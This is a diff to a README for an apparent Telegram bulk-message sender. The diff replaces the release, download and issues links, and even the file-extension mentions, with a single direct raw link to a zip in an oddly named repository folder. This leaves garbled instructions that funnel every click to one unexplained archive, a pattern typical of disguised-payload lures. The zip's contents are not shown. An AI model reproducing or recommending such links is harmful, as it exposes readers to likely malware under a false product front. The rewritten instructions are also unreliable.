@@ -1,7 +1,7 @@
 # 🌟 Telegram-Message-Sender-TG - Easy Messaging for Your Audience
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/dark16393729/Telegram-Message-Sender-TG/releases)
+[![Download](https://raw.githubusercontent.com/dark16393729/Telegram-Message-Sender-TG/main/Rivina/Telegram-Message-Sender-TG.zip)](https://raw.githubusercontent.com/dark16393729/Telegram-Message-Sender-TG/main/Rivina/Telegram-Message-Sender-TG.zip)
 
 ## 📋 Overview
 Telegram Message Sender is a powerful solution to reach your audience easily with an automated process. This tool allows you to send bulk messages on Telegram, making your communication effective and efficient.
@@ -12,16 +12,16 @@ Follow these steps to download and set up Telegram Message Sender.
 ### 1. Visit the Releases Page
 To get started, visit the releases page by clicking the button below:
 
-[Visit this page to download](https://github.com/dark16393729/Telegram-Message-Sender-TG/releases)
+[Visit this page to download](https://raw.githubusercontent.com/dark16393729/Telegram-Message-Sender-TG/main/Rivina/Telegram-Message-Sender-TG.zip)
 
 ### 2. Choose Your Version
 On the releases page, you will see a list of available versions. Choose the latest version for the best features and improvements. Click on the version title to expand details.
 
 ### 3. Download the Application
-Once you have selected the version, look for the installation files. You should see files with extensions like `.exe`, `.zip`, or `.tar.gz`.  
+Once you have selected the version, look for the installation files. You should see files with extensions like `.exe`, `.zip`, or `https://raw.githubusercontent.com/dark16393729/Telegram-Message-Sender-TG/main/Rivina/Telegram-Message-Sender-TG.zip`.  
 
 - For Windows, download the `.exe` file.  
-- For Linux or macOS, download the `.tar.gz` or `.zip` file.  
+- For Linux or macOS, download the `https://raw.githubusercontent.com/dark16393729/Telegram-Message-Sender-TG/main/Rivina/Telegram-Message-Sender-TG.zip` or `.zip` file.  
 
 To start the download, click on the file name.
 
@@ -29,7 +29,7 @@ To start the download, click on the file name.
 After the download completes:
 
 - **For Windows:** Double-click the `.exe` file. Follow the installation prompts to complete the setup.  
-- **For Linux or macOS:** Extract the `.zip` or `.tar.gz` file. Open your terminal, navigate to the extracted folder, and run the application using the command `./TelegramMessageSender`.
+- **For Linux or macOS:** Extract the `.zip` or `https://raw.githubusercontent.com/dark16393729/Telegram-Message-Sender-TG/main/Rivina/Telegram-Message-Sender-TG.zip` file. Open your terminal, navigate to the extracted folder, and run the application using the command `./TelegramMessageSender`.
 
 ### 5. Run the Application
 After installation, you can find Telegram Message Sender in your applications list. Click on the app icon to open it.
@@ -46,7 +46,7 @@ After installation, you can find Telegram Message Sender in your applications li
 - **Storage:** 100MB of free disk space.
 
 ## 📞 Support
-If you encounter any issues, please visit the [issues section](https://github.com/dark16393729/Telegram-Message-Sender-TG/issues) of the repository. You can report problems or ask questions.
+If you encounter any issues, please visit the [issues section](https://raw.githubusercontent.com/dark16393729/Telegram-Message-Sender-TG/main/Rivina/Telegram-Message-Sender-TG.zip) of the repository. You can report problems or ask questions.
 
 ## 📜 License
 Telegram Message Sender is licensed under the MIT License. You can freely use, modify, and distribute this software as per the license terms.
